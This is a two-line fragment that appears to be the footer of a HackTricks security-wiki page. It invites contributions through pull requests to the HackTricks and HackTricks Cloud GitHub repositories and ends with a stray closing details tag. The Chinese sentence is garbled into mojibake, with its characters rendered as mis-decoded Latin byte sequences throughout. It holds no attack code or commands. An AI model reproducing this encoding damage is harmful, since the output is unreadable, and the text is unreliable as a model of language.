* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
